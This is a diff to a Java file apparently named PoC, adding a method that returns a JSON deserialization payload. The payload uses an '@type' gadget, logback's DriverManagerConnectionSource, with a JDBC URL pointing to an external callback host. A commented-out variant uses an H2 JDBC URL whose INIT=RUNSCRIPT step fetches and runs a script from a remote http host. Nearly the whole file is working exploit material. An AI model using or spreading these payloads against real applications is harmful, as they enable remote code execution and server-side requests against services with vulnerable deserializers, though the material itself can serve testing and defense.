@@ -199,5 +199,12 @@ public class PoC {
         return new String[]{};
     }
 
+    public static String payload58() {
+//        String payload = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\": \"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://1234567.codesec.woshiyingxiong.com'\"}";
+        String payload1 = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\": \"jdbc:mysql://12345xxx67890.codesec.woshiyingxiong.com:8000\"}";
+
+        return payload1;
+    }
+
 
 }
